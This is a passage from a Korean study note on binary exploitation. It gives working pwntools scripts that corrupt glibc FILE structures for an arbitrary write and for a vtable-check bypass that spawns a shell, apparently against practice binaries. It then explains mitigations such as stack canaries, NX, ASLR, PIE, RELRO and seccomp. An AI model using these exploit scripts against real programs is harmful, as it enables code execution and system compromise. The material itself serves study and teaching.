# _IO_buf_base, 미사용\rpayload += p64(0) # _IO_buf_end, 미사용\rpayload += p64(0) # _IO_save_base, 미사용\rpayload += p64(0) # _IO_backup_base, 미사용\rpayload += p64(0) # _IO_save_end, 미사용\rpayload += p64(0) # struct _IO_marker, 미사용\rpayload += p64(0) # struct _IO_FILE, 미사용\rpayload += p64(1) # _fileno, 파일 디스크립터 값을 stdout 로 설정\rp.sendlineafter(b\u0026#39;Data: \u0026#39;, payload)\rp.interactive() exploit 예시 2 전제조건\n파일 포인터의 값을 덮어쓸 수 있어야 한다. 덮어쓴 파일 포인터를 이용해 변수의 값을 overwrite 한다. 2번을 통해 특정 구문이 실행되도록 if 문의 조건을 조작하면 원하는 결과가 실행되는 형태로 코드가 구성되어 있다. if (조건문) { 원하는_결과 } 일때, \u0026lsquo;조건문\u0026rsquo; 을 강제로 참으로 만들어 \u0026lsquo;원하는_결과\u0026rsquo; 가 실행되가 하는 것이 목표 exploit 원리:\n파일 내용을 읽는 함수(fread, fgets) 들은 내부적으로 _IO_file_xsgetn 함수(_IO_xsgetn_t)를 호출한다. _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n) 가 호출되면, fp-\u0026gt;_IO_buf_end - fp-\u0026gt;_IO_buf_base 값이 n 보다 큰지 확인하고, 조건을 만족한다면 __underflow -\u0026gt; _IO_new_file_underflow 를 호출한다. (if (fp-\u0026gt;_IO_buf_base \u0026amp;\u0026amp; want \u0026lt; (size_t) (fp-\u0026gt;_IO_buf_end - fp-\u0026gt;_IO_buf_base)))) _IO_new_file_underflow(FILE *fp) 가 호출되면 _flags 변수에 읽기 금지 flag(_IO_NO_READS)가 포함되어 있는지 확인하고, 포함되어있지 않다면 _IO_SYSREAD 를 호출한다. (if (fp-\u0026gt;_flags \u0026amp; _IO_NO_READS) return EOF;) _IO_SYSREAD 함수는 vtable 의 _IO_file_read 에 매핑되어 있다. _IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size) 가 호출되면 read 시스템 콜을 사용하여 __read (fp-\u0026gt;_fileno, buf, size)) 형태로 읽기를 수행한다. 최종적으로 파일 내용을 읽는 함수(fread, fgets 등)들은 read(f-\u0026gt;_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base) 형태의 함수가 호출되는 것과 같다. exploit 방법:\nif문의 조건에 해당하는 버퍼(\u0026lsquo;overwrite_me\u0026rsquo;) 의 주소를 알아낸다. file 구조체의 값들을 overwrite 하기 위한 payload 를 작성한다. file write 구문이 실행되었을 때, 변수에 원하는 값을 입력한다. 전체 코드\n#!/usr/bin/env python3\rimport time\rfrom pwn import *\rp = process(\u0026#39;./iofile_aaw\u0026#39;)\relf = ELF(\u0026#39;./iofile_aaw\u0026#39;)\roverwrite_me = elf.symbols[\u0026#39;overwrite_me\u0026#39;] # 변수 이름으로 주소 확인\rpayload = p64(0xfbad0000) # flag 에 _IO_MAGIC 설정. _IO_NO_READS(0x04) 만 포함되지 않으면 됨\rpayload += p64(0) # _IO_read_ptr, 미사용\rpayload += p64(0) # _IO_read_end, 미사용\rpayload += p64(0) # _IO_read_base, 미사용\rpayload += p64(0) # _IO_write_base, 미사용\rpayload += p64(0) # _IO_write_ptr, 미사용\rpayload += p64(0) # _IO_write_end, 미사용\rpayload += p64(overwrite_me) # _IO_buf_base, overwrite 할 변수의 시작주소\rpayload += p64(overwrite_me + 1024) # _IO_buf_end, overwrite 할 변수의 시작주소 + 크기\rpayload += p64(0) # _IO_save_base, 미사용\rpayload += p64(0) # _IO_backup_base, 미사용\rpayload += p64(0) # _IO_save_end, 미사용\rpayload += p64(0) # _markers, 미사용\rpayload += p64(0) # _chain, 미사용\rpayload += p64(0) # _fileno, stdin 에 해당하는 \u0026#39;0\u0026#39; 을 대입\rp.sendlineafter(b\u0026#39;Data: \u0026#39;, payload) # payload 전송, file 구조체 overwrite\rtime.sleep(10) # fread 작업이 수행될 때 까지 잠시 대기\rp.send(p64(0xDEADBEEF) + b\u0026#39;\\x00\u0026#39;*1024) # overwrite_me 변수에 채워넣어야 할 값\rp.interactive() exploit 예시 3 file IO 동작시 vtable을 검증하는 과정을 bypass 시켜서 권한을 탈취하는 방법이다.(bypass IO_validate_vtable)\nvtable에 매핑된 file IO 함수를 실행시키면 IO_validate_vtable 함수기 실행되는데, IO_validate_vtable 함수는 인자로 전달받은 struct _IO_jump_t 타입(vtable 함수 포인터)의 주소가 __start___libc_IO_vtables ~ __stop___libc_IO_vtables 위치 사이에 있는지 확인한다. 즉, __libc_IO_vtables 섹션에 할당되는지를 체크하고, 조건을 만족하지 못한다면 _IO_vtable_check 에러를 발생시킨다.따라서 IO_validate_vtable 검증 함수가 생긴 이후로는 vtable 포인터를 아무 함수로 덮어 써서 공격할 수 없게 되었다.\nIO_validate_vtable 의 포인터 주소 검사를 우회할 수 있는 함수중 하나는 _IO_str_overflow 함수가 있다. _IO_str_overflow 함수는 vtable에 JUMP_FIELD(_IO_overflow_t, __overflow); 형태로 정의된 함수이기 때문에 주소 검사에서 통과된다.\n_IO_str_overflow 함수 내부에서는 new_buf\t= (char *) (*((_IO_strfile *) fp)-\u0026gt;_s._allocate_buffer) (new_size); 구문이 실행되는데, _allocate_buffer 와 new_size 를 잘 조작하여 system('/bin/bash') 형태로 변경하면 exploit 이 가능하다.\n_s._allocate_buffer 은 vtable 의 첫 8byte에 위치한다 (JUMP_FIELD(size_t, __dummy); 형태). vtable의 첫 8byte에 system 함수를 대입시키면 된다. new_size 는 2 * (_IO_buf_end - _IO_buf_base) + 100 값이 적용된다 (old_blen = (fp)-\u0026gt;_IO_buf_end - (fp)-\u0026gt;_IO_buf_base; _IO_size_t new_size = 2 * old_blen + 100; 구문). _IO_buf_end 를 라이브러리의 /bin/sh 문자열이 저장된 주소로 치환하고, _IO_buf_base 를 0 으로 덮어쓰면 된다. 전제조건\n코드에서 std 라이브러리 구성요소의 주소를 확인할 수 있다. (예시에서는 라이브러리 릭 과정을 생략하기 위해 stdout을 미리 출력하도록 세팅되었다.) 파일 포인터를 덮어쓸 수 있다. fclose 를 호출한다. (fclose 외 다른 파일 구조체 함수도 적용 가능) exploit 방법\n라이브러리 릭을 통해 _IO_jump_t 구조체의 주소를 획득한다. (유출된 stdout 의 주소로 _IO_jump_t 정의 부분 주소를 획득)\nfclose 는 _IO_FINISH -\u0026gt; _IO_finish_t 순서대로 함수를 호출하는데, _IO_finish_t은 vtable + 16byte (즉 JUMP_FIELD(_IO_finish_t, __finish); 형태로 정의된 함수) 에 위치한 함수를 호출한다. FILE 포인터를 overwrite 할 때 vtable 의 시작 주소를 조작하여 _IO_finish_t 의 위치에 _IO_str_overflow 함수의 주소가 오도록 설정한다.\n그러면 fclose 호출시 _IO_str_overflow 가 호출되고, s._allocate_buffer) (new_size) 구문이 실행된다. vtable 함수를 그대로 사용하였기 때문에 IO_validate_vtable 검사도 통과할 수 있다. _IO_file_jumps + 0xC0 에 위치한 구조체는 _IO_str_jumps의 구조체로, _IO_str_jumps + 0x18 위치에 _IO_str_overflow 가 있다. 참고: _IO_file_overflow 와 _IO_str_overflow 는 같은 위치를 가리키지만, _IO_file_overflow 로 exploit을 시도하면 실패했다. gdb 에서 _IO_file_jumps 구조체의 주소를 확인하고, 그 주소에 적힌 값들을 출력해 보면 _IO_file_jumps 의 주소가 \u0026ldquo;0x7ffff7dca2a0\u0026rdquo; 일 때, \u0026ldquo;0x7ffff7dca2a0 + 0xC0\u0026rdquo; 위치의 값들과 형태가 유사한 것을 확인 할 수 있다. pwndbg\u0026gt; p \u0026amp;_IO_file_jumps\r$5 = (const struct _IO_jump_t *) 0x7ffff7dca2a0 \u0026lt;_IO_file_jumps\u0026gt;\rpwndbg\u0026gt; tele (0x7ffff7dca2a0)\r00:0000│ 0x7ffff7dca2a0 (_IO_file_jumps) ◂— 0x0\r01:0008│ 0x7ffff7dca2a8 (_IO_file_jumps+8) ◂— 0x0\r02:0010│ 0x7ffff7dca2b0 (_IO_file_jumps+16) —▸ 0x7ffff7a6e2d0 (_IO_file_finish) ◂— push rbp\r03:0018│ 0x7ffff7dca2b8 (_IO_file_jumps+24) —▸ 0x7ffff7a6f2b0 (_IO_file_overflow) ◂— mov ecx, dword ptr [rdi]\r04:0020│ 0x7ffff7dca2c0 (_IO_file_jumps+32) —▸ 0x7ffff7a6efd0 (_IO_file_underflow) ◂— mov eax, dword ptr [rdi]\r05:0028│ 0x7ffff7dca2c8 (_IO_file_jumps+40) —▸ 0x7ffff7a70370 (_IO_default_uflow) ◂— push rbp\r06:0030│ 0x7ffff7dca2d0 (_IO_file_jumps+48) —▸ 0x7ffff7a71c00 (_IO_default_pbackfail) ◂— push r15\r07:0038│ 0x7ffff7dca2d8 (_IO_file_jumps+56) —▸ 0x7ffff7a6d8d0 (_IO_file_xsputn) ◂— push r15\rpwndbg\u0026gt; tele (0x7ffff7dca2a0+0xc0)\r00:0000│ 0x7ffff7dca360 (_IO_str_jumps) ◂— 0x0\r01:0008│ 0x7ffff7dca368 (_IO_str_jumps+8) ◂— 0x0\r02:0010│ 0x7ffff7dca370 (_IO_str_jumps+16) —▸ 0x7ffff7a722a0 (_IO_str_finish) ◂— push rbx\r03:0018│ 0x7ffff7dca378 (_IO_str_jumps+24) —▸ 0x7ffff7a71f10 (_IO_str_overflow) ◂— mov ecx, dword ptr [rdi]\r04:0020│ 0x7ffff7dca380 (_IO_str_jumps+32) —▸ 0x7ffff7a71eb0 (_IO_str_underflow) ◂— mov rax, qword ptr [rdi + 0x28]\r05:0028│ 0x7ffff7dca388 (_IO_str_jumps+40) —▸ 0x7ffff7a70370 (_IO_default_uflow) ◂— push rbp\r06:0030│ 0x7ffff7dca390 (_IO_str_jumps+48) —▸ 0x7ffff7a72280 (_IO_str_pbackfail) ◂— test byte ptr [rdi], 8\r07:0038│ 0x7ffff7dca398 (_IO_str_jumps+56) —▸ 0x7ffff7a703d0 (_IO_default_xsputn) ◂— test rdx, rdx\r# 참고\rpwndbg\u0026gt; x/x _IO_file_overflow\r0x7ffff7a6f2b0 \u0026lt;_IO_new_file_overflow\u0026gt;: 0xc1f60f8b\rpwndbg\u0026gt; x/x _IO_str_overflow\r0x7ffff7a71f10 \u0026lt;__GI__IO_str_overflow\u0026gt;: 0xc1f60f8b\r# 주소는 같지만 _IO_file_overflow 으로는 사용 불가 _s._allocate_buffer = system, _IO_buf_end = (\u0026rsquo;/bin/sh 의 주소\u0026rsquo; - 100) / 2, _IO_buf_base = 0 이 되도록 vtable을 설정한다.\n프로그램에서 파일 포인터의 주소를 획득하여 _s._allocate_buffer 함수의 주소를 획득한다. libc 에서 \u0026ldquo;/bin/sh\u0026rdquo; 문자열과 system 함수의 주소를 획득한다. 전체 코드\n#!/usr/bin/env python3\rfrom pwn import *\rp = process(\u0026#39;./bypass_valid_vtable\u0026#39;, env={\u0026#39;LD_PRELOAD\u0026#39;:\u0026#39;./libc.so.6\u0026#39;})\rlibc = ELF(\u0026#39;./libc.so.6\u0026#39;)\relf = ELF(\u0026#39;./bypass_valid_vtable\u0026#39;)\rp.recvuntil(b\u0026#39;stdout: \u0026#39;) # 필요없는 출력 버리기\rleak = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).strip(b\u0026#39;\\n\u0026#39;), 16) # 문제에서 일부러 유출시킨 stdout 의 주소\r# [1] _IO_file_jumps 주소 획득\rlibc_base = leak - libc.symbols[\u0026#39;_IO_2_1_stdout_\u0026#39;] # libc_base 주소 획득. stdout 의 주소에서 stdout 의 offset 빼기\rio_file_jumps = libc_base + libc.symbols[\u0026#39;_IO_file_jumps\u0026#39;] # _IO_jump_t 구조체(vtable)의 주소 획득\r# [2-1] _IO_str_overflow 주소 획득, vtable 시작주소 변조\rio_str_overflow = io_file_jumps + 0xd8 # _IO_str_overflow 함수의 주소가 저장된 위치의 주소를 획득\rfake_vtable = io_str_overflow - 16 # fclose는 vtable + 16byte 에 위치한 함수(_IO_finish_t) 을 실행시킨다. vtable + 16byte 위치에 _IO_str_overflow 함수가 존재하도록 vtable 주소를 역산한다.\r# [3-1] libc 에서 필요한 요소들 주소 획득, 파일 포인터 \u0026#39;fp\u0026#39; 주소 획득\rbinsh = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) # \u0026#34;/bin/sh\u0026#34; 문자열이 저장된 주소 획득\rsystem = libc_base + libc.symbols[\u0026#39;system\u0026#39;] # system 함수의 주소 획득\rfp = elf.symbols[\u0026#39;fp\u0026#39;]\r# 디버깅\rprint(f\u0026#39;io_file_jumps: 0x{io_file_jumps:X}\u0026#39;)\rprint(f\u0026#39;io_file_overflow: 0x{io_file_overflow:X}\u0026#39;)\rprint(f\u0026#39;io_str_overflow: 0x{io_str_overflow:X}\u0026#39;)\rprint(f\u0026#39;fake_vtable: 0x{fake_vtable:X}\u0026#39;)\r# payload 작성\rpayload = p64(0x0) # flags, 미사용\rpayload += p64(0x0) # _IO_read_ptr, 미사용\rpayload += p64(0x0) # _IO_read_end, 미사용\rpayload += p64(0x0) # _IO_read_base, 미사용\rpayload += p64(0x0) # _IO_write_base, 미사용\rpayload += p64(( (binsh - 100) // 2 )) # _IO_write_ptr, [3-2] 2 * (_IO_buf_end - _IO_buf_base) + 100 값이 \u0026#34;/bin/sh\u0026#34; 문자열의 주소를 가키리도록 설정\rpayload += p64(0x0) # _IO_write_end, 미사용\rpayload += p64(0x0) # _IO_buf_base, [3-2] 0으로 세팅\rpayload += p64(( (binsh - 100) // 2 )) # _IO_buf_end\rpayload += p64(0x0) # _IO_save_base, 미사용\rpayload += p64(0x0) # _IO_backup_base, 미사용\rpayload += p64(0x0) # _IO_save_end, 미사용\rpayload += p64(0x0) # _IO_marker, 미사용\rpayload += p64(0x0) # _IO_chain, 미사용\rpayload += p64(0x0) # _fileno, _flags2 (int, int), 미사용\rpayload += p64(0x0) # _old_offset, 미사용\rpayload += p64(0x0) # _cur_column, _vtable_offset, _shortbuf (short, char, short, + 구조체 최적화용 padding), 미사용\rpayload += p64(fp + 0x80) # _lock, [3-2] fp 값을 덮어쓴 이후 적당히 오염되어도 되는 자리를 지정\rpayload += p64(0x0) * 9 # _offset, _codecvt, _wide_data, _freeres_list, _freeres_buf, __pad5, _mode, _unused2 (총 72byte), 미사용\rpayload += p64(fake_vtable) # io_file_jump overwrite, [2-2] 변조한 vtable 주소 세팅\rpayload += p64(system) # fp-\u0026gt;_s._allocate_buffer, [3-2] _allocate_buffer 함수를 system 함수로 대체\rp.sendline(payload)\rp.interactive() 보호 기법 앞서 살펴본 취약점을 방어하기 위한 기법들을 소개한다. Stack Canary 광부들이 탄광에 들어갈 때 카나리아 새를 데리고 들어간다. 카나리아는 인간보다 가스에 민감하여, 유독가스로 인해 위험한 상황이 발생 할 경우 카나리아가 먼저 이를 인지하고 이상 행동을 보이게 된다. 광부들은 카나리아의 행동을 관찰하며 위험한 환경에서 빨리 탈출할 수 있다. 탄광의 카나리아 새를 따서 Stack의 overflow를 감지하는 기능도 Stack Canary 라 이름 짓는다. 우분투에서 C 파일을 컴파일 할 때 기본적으로 Stack Canary를 적용하며, -fno-stack-protector 옵션을 넣어 gcc 컴파일을 하면 Stack Canary 설정을 끌 수 있다. Stack이 오염되면 대부분은 Segmentation Fault 오류를 발생하며 종료된다. Stack Canary가 설정되어 있으면 stack smashing detected 오류가 대신 발생한다. 이는 Stack의 오염이 감지되어 강제로 프로그램이 종료됨을 의미한다. Stack Canary의 동작을 어셈블리어로 표현하면 다음과 같다. mov rax,QWORD PTR fs:0x28 # fs 레지스터의 0x28값을 rax에 대입\rmov QWORD PTR [rbp-0x8],rax # 스택 카나리를 rbp-8에 저장\rcall FUNCTION # 함수 호출\r...\rmov rcx,QWORD PTR [rbp-0x8] # rbp-8에서 스택 카나리 추출\rxor rcx,QWORD PTR fs:0x28 # fs:0x28과 스택 카나리 비교\rje 0x6f0 \u0026lt;main+94\u0026gt; # 값이 같으면 다르면 호출부로 이동\rcall __stack_chk_fail@plt # 값이 다르면 에러 출력 fs는 세그먼트 레지스터의 일종으로, 리눅스는 부팅시 fs:0x28 위치에 랜덤 생성하여 저장한다. X64 아키텍처는 8바이트, X86 아키텍처는 4바이트 카나리를 사용한다. stack에 적용될 때 x64 아키텍처는 8바이트, x86 아키텍처는 4바이트 더미값 이후 canary가 들어감에 주의한다. stack참조 카나리는 NULL 값으로 시작한다. 카나리는 TLS에 전역변수로 저장되고, 각 함수들이 이를 공용으로 참조한다. NX No eXecute의 약자로, 실행에 사용되는 메모리 영역과 writing에 사용되는 메모리 영역을 분리하여 악의적으로 buffer에 코드를 심어 실행시키는 행위를 방지하는 기법이다. NX 기법은 CPU가 지원해야 동작할 수 있다. NX가 적용된 바이너리를 gdb로 디버깅 하여 vmmap 명령으로 각 주소의 권한을 살펴보면 Perm 영역이 \u0026lsquo;rw\u0026rsquo;와 \u0026lsquo;x\u0026rsquo; 가 분리된 것이 확인된다. 실행 권한이 없는 주소를 실행시키려 하면 segment fault 가 발생하며 코드가 종료되게 된다. NX기법은 XD(eXecution Disable), DEP(Data Execution Prevention), XN(eXecute Never) 등으로 불리기도 한다. ASLR Address Space Layout Randomization 의 약자로 바이너리가 실행 될 때 마다 매번 다른 주소값에 메모리 세그먼트들을 할당하여 주소의 유출을 방지하는 기법이다. 커널에서 ASLR을 지원해야 동작이 가능하다. 리눅스에서 cat /proc/sys/kernel/randomize_va_space 명령으로 해당 커널이 ASLR을 지원하는지 확인 가능하다. 0 : ASLR 미지원 1 : stack, heap, library, vdso 등의 주소를 랜덤화 2 : (1) 에 더해 brk 영역도 랜덤화 리눅스는 ASLR이 적용됐을 때, 페이지(page) 단위로 파일을 매핑하기 때문에 주소값 64비트 중 상위 52비트의 주소는 바뀌어도 하위 12비트는 변경되지 않는다. 0x1111111111111222 : 1은 변경될 수 있고, 2는 고정 예를들어 라이브러리의 printf의 함수의 주소가 0x12345678이라면, 다음번 실행시에도 마지막 12비트는 678임이 보장된다. main 함수의 주소는 여러번 실행해도 변경되지 않는다. PIE Position Independent Executable 의 약자이다.\nASLR이 런타임에 생성되는 stack, heap, library 영역의 메모리를 랜덤 매핑하는 기법이었다면, PIE는 code 영역의 메모리를 랜덤하게 매핑하는 보호 기법이다.\n리눅스의 ELF는 Executable(실행파일) 파일과 Shared Object(공유파일) 로 양분되는데 Shared Object 는 메모리 상에 어디에 올려놓아도 동작 가능하도록 설계되어 있다.\n메모리 위치에 제약을 받지 않는 이러한 성질을 가진 코드를 Position-Independent Code 줄여서 PIC 라 부른다.\nShared Object 들은 최초 설계 시에 PIC 속성을 갖도록 설계되었고, Executable 파일들은 그렇지 않았다. 실행 파일들도 PIC 속성을 갖게 하려고 Shared Object 형태로 구성하였고, 이를 PIE(Position-Independent Executable) 라 명명하였다.\nPIE로 구성된 코드들은 ASLR 이 적용되면 다른 Shared Object 와 마찬가지로 랜덤한 주소에 배치받게 된다.\nASLR에 의해 PIE 코드가 랜덤한 메모리에 적재되면 그 시작 주소를 base code, 혹은 PIE base 라 칭한다.\nPIE 보호기법이 적용되면 code 영역과 bss 영역의 메모리는 실행시 마다 랜덤하게 배정된다.\nRELRO (RELocation Read-Only) 데이터 세그먼트에서 불필요한 쓰기 권한을 제거하여 공격을 방지하는 방법 Partial RELRO 와 Full RELRO 두 가지 방법이 있다. gcc 컴파일 시 -no-pie -fno-pie 옵션을 넣어서 pie를 제거하면 partial RELRO 로 동작한다. -no-pie는 코드 생성 옵션이고, -fno-pie는 링킹 과정의 옵션으로 둘 다 설정해야 PIE 없이 바이너리가 생성된다. 위 두 옵션 없이 gcc 컴파일을 수행하면 Full RELRO가 적용된다. Partial RELRO 가 적용된 파일을 objdump -h 명령어로 확인하면 section에 .got와 .got.plt 가 확인된다. .got section에는 실행되기 전에 바인딩 되는 전역변수들이 저장되며 쓰기 권한이 없다. .got.plt section에는 실행되는 도중 바인딩 되는 전역변수들이 저장되며 쓰기 권한이 부여된다. .got.plt 영역을 덮어쓰는 GOT overwrite 공격에 취약하다. Full RELRO 가 적용되면 함수들의 주소가 바이너리 로딩 시점에 모두 바인딩 되므로 .got 영역에는 쓰기 권한이 부여되지 않는다. 동적 메모리 할당/해제시 동작하는 hook 을 이용한 공격인 Hook Overwrite 에 취약하다. segment 권한 확인 방법 특정 프로세스에서 /proc/self/maps 경로의 파일을 출력하도록 코드를 작성한다. 작성한 코드를 컴파일 하고, 실행 파일을 생성한다. 실행 파일을 실행하여 /proc/self/maps 파일 내용을 확인한다. 내용 중 파일명 에 해당하는 부분이 메모리 시작주소이다. ex) objdump -h /usr/bin/cat 결과이다. /usr/bin/cat 의 메모리 시작주소는 0x561210c55000 가 된다. 561210c55000-561210c57000 r--p 00000000 08:20 1773 /usr/bin/cat\r561210c57000-561210c5c000 r-xp 00002000 08:20 1773 /usr/bin/cat\r561210c5c000-561210c5f000 r--p 00007000 08:20 1773 /usr/bin/cat\r561210c5f000-561210c60000 r--p 00009000 08:20 1773 /usr/bin/cat\r561210c60000-561210c61000 rw-p 0000a000 08:20 1773 /usr/bin/cat\r5612123c3000-5612123e4000 rw-p 00000000 00:00 0 [heap]\r7f84ddb0a000-7f84ddb2c000 rw-p 00000000 00:00 0\r7f84ddb2c000-7f84ddb5e000 r--p 00000000 08:20 25559 /usr/lib/locale/C.UTF-8/LC_CTYPE\r7f84ddb5e000-7f84ddb5f000 r--p 00000000 08:20 25620 /usr/lib/locale/C.UTF-8/LC_NUMERIC\r7f84ddb5f000-7f84ddb60000 r--p 00000000 08:20 26418 /usr/lib/locale/C.UTF-8/LC_TIME\r7f84ddb60000-7f84ddcd3000 r--p 00000000 08:20 25554 /usr/lib/locale/C.UTF-8/LC_COLLATE\r7f84ddcd3000-7f84ddcd4000 r--p 00000000 08:20 25593 /usr/lib/locale/C.UTF-8/LC_MONETARY\r7f84ddcd4000-7f84ddcd5000 r--p 00000000 08:20 25575 /usr/lib/locale/C.UTF-8/LC_MESSAGES/SYS_LC_MESSAGES\r7f84ddcd5000-7f84ddcd6000 r--p 00000000 08:20 26123 /usr/lib/locale/C.UTF-8/LC_PAPER\r7f84ddcd6000-7f84ddcd7000 r--p 00000000 08:20 25601 /usr/lib/locale/C.UTF-8/LC_NAME\r7f84ddcd7000-7f84ddfbd000 r--p 00000000 08:20 15009 /usr/lib/locale/locale-archive\r7f84ddfbd000-7f84ddfdf000 r--p 00000000 08:20 42427 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r7f84ddfdf000-7f84de157000 r-xp 00022000 08:20 42427 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r7f84de157000-7f84de1a5000 r--p 0019a000 08:20 42427 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r7f84de1a5000-7f84de1a9000 r--p 001e7000 08:20 42427 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r7f84de1a9000-7f84de1ab000 rw-p 001eb000 08:20 42427 /usr/lib/x86_64-linux-gnu/libc-2.31.so\r7f84de1ab000-7f84de1b1000 rw-p 00000000 00:00 0\r7f84de1b1000-7f84de1b2000 r--p 00000000 08:20 25549 /usr/lib/locale/C.UTF-8/LC_ADDRESS\r7f84de1b2000-7f84de1b3000 r--p 00000000 08:20 26189 /usr/lib/locale/C.UTF-8/LC_TELEPHONE\r7f84de1b3000-7f84de1b4000 r--p 00000000 08:20 25574 /usr/lib/locale/C.UTF-8/LC_MEASUREMENT\r7f84de1b4000-7f84de1bb000 r--s 00000000 08:20 42694 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\r7f84de1bb000-7f84de1bc000 r--p 00000000 08:20 42407 /usr/lib/x86_64-linux-gnu/ld-2.31.so\r7f84de1bc000-7f84de1df000 r-xp 00001000 08:20 42407 /usr/lib/x86_64-linux-gnu/ld-2.31.so\r7f84de1df000-7f84de1e7000 r--p 00024000 08:20 42407 /usr/lib/x86_64-linux-gnu/ld-2.31.so\r7f84de1e7000-7f84de1e8000 r--p 00000000 08:20 25569 /usr/lib/locale/C.UTF-8/LC_IDENTIFICATION\r7f84de1e8000-7f84de1e9000 r--p 0002c000 08:20 42407 /usr/lib/x86_64-linux-gnu/ld-2.31.so\r7f84de1e9000-7f84de1ea000 rw-p 0002d000 08:20 42407 /usr/lib/x86_64-linux-gnu/ld-2.31.so\r7f84de1ea000-7f84de1eb000 rw-p 00000000 00:00 0\r7ffcf0c34000-7ffcf0c55000 rw-p 00000000 00:00 0 [stack]\r7ffcf0d14000-7ffcf0d18000 r--p 00000000 00:00 0 [vvar]\r7ffcf0d18000-7ffcf0d1a000 r-xp 00000000 00:00 0 [vdso] 생성한 실행파일을 objdump -h 명령어를 사용해 section header를 확인한다. section header의 VMA에 해당하는 부분이 메모리의 offset이다. (3)에서 찾은 메모리 시작주소에 offset을 더하면 실제 메모리 주소를 확인할 수 있다. ex) .plt 의 메모리 주소는 0x561210c55000 + 0x0000000000002020 = 0x561210C57020 가 된다. /usr/bin/cat: file format elf64-x86-64\rSections:\rIdx Name Size VMA LMA File off Algn\r0 .interp 0000001c 0000000000000318 0000000000000318 00000318 2**0\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r1 .note.gnu.property 00000020 0000000000000338 0000000000000338 00000338 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r2 .note.gnu.build-id 00000024 0000000000000358 0000000000000358 00000358 2**2\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r3 .note.ABI-tag 00000020 000000000000037c 000000000000037c 0000037c 2**2\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r4 .gnu.hash 0000006c 00000000000003a0 00000000000003a0 000003a0 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r5 .dynsym 00000690 0000000000000410 0000000000000410 00000410 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r6 .dynstr 0000033d 0000000000000aa0 0000000000000aa0 00000aa0 2**0\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r7 .gnu.version 0000008c 0000000000000dde 0000000000000dde 00000dde 2**1\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r8 .gnu.version_r 00000060 0000000000000e70 0000000000000e70 00000e70 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r9 .rela.dyn 00000378 0000000000000ed0 0000000000000ed0 00000ed0 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r10 .rela.plt 00000498 0000000000001248 0000000000001248 00001248 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r11 .init 0000001b 0000000000002000 0000000000002000 00002000 2**2\rCONTENTS, ALLOC, LOAD, READONLY, CODE\r12 .plt 00000320 0000000000002020 0000000000002020 00002020 2**4\rCONTENTS, ALLOC, LOAD, READONLY, CODE\r13 .plt.got 00000010 0000000000002340 0000000000002340 00002340 2**4\rCONTENTS, ALLOC, LOAD, READONLY, CODE\r14 .plt.sec 00000310 0000000000002350 0000000000002350 00002350 2**4\rCONTENTS, ALLOC, LOAD, READONLY, CODE\r15 .text 00003dc2 0000000000002660 0000000000002660 00002660 2**4\rCONTENTS, ALLOC, LOAD, READONLY, CODE\r16 .fini 0000000d 0000000000006424 0000000000006424 00006424 2**2\rCONTENTS, ALLOC, LOAD, READONLY, CODE\r17 .rodata 0000122c 0000000000007000 0000000000007000 00007000 2**5\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r18 .eh_frame_hdr 000002bc 000000000000822c 000000000000822c 0000822c 2**2\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r19 .eh_frame 00000ce8 00000000000084e8 00000000000084e8 000084e8 2**3\rCONTENTS, ALLOC, LOAD, READONLY, DATA\r20 .init_array 00000008 000000000000aa90 000000000000aa90 00009a90 2**3\rCONTENTS, ALLOC, LOAD, DATA\r21 .fini_array 00000008 000000000000aa98 000000000000aa98 00009a98 2**3\rCONTENTS, ALLOC, LOAD, DATA\r22 .data.rel.ro 00000198 000000000000aaa0 000000000000aaa0 00009aa0 2**5\rCONTENTS, ALLOC, LOAD, DATA\r23 .dynamic 000001f0 000000000000ac38 000000000000ac38 00009c38 2**3\rCONTENTS, ALLOC, LOAD, DATA\r24 .got 000001c8 000000000000ae28 000000000000ae28 00009e28 2**3\rCONTENTS, ALLOC, LOAD, DATA\r25 .data 000000c0 000000000000b000 000000000000b000 0000a000 2**5\rCONTENTS, ALLOC, LOAD, DATA\r26 .bss 00000198 000000000000b0c0 000000000000b0c0 0000a0c0 2**5\rALLOC\r27 .gnu_debuglink 00000034 0000000000000000 0000000000000000 0000a0c0 2**2\rCONTENTS, READONLY (4)에서 확인한 메모리 주소가 (3)에서 출력한 메모리 주소별 권한을 대조하여, 해당 영역의 권한을 확인할 수 있다. .plt 영역인 0x561210C57020 는 561210c57000-561210c5c000 r-xp 00002000 08:20 1773 /usr/bin/cat 라인에 해당하며, 읽기/실행 권한이 있고, 쓰기 권한은 부여되지 않은 것이 확인된다. RELRO가 적용되어 .fini_array 와 .init_array 영역은 쓰기 권한이 없는 것이 확인된다. checksec 명령으로 확인 결과 Full RELRO가 적용된 것이 확인된다. checksec /usr/bin/cat\r[*] \u0026#39;/usr/bin/cat\u0026#39;\rArch: amd64-64-little\rRELRO: Full RELRO\rStack: Canary found\rNX: NX enabled\rPIE: PIE enabled\rFORTIFY: Enabled Sandbox 외부와 내부의 환경을 분리하여 외부로부터 시스템을 격리 보호하는 기법으로, Allow List / Deny List 를 통해 필요한 시스템 콜 혹은 파일 접근 권한만 허용하여 외부 공격을 최소화 한다. SECCOMP 리눅스 커널에서 샌드박스 매커니즘을 제공하는 보안 기능으로, SECure COMPuting mode 를 축약한 단어이다. 허가되지 않은 시스템 콜을 어플리케이션에서 호출 할 경우, SECCOMP는 즉시 어플리케이션을 종료시킨다. SECCOMP는 두 가지 모드로 동작을 설정 할 수 있다. 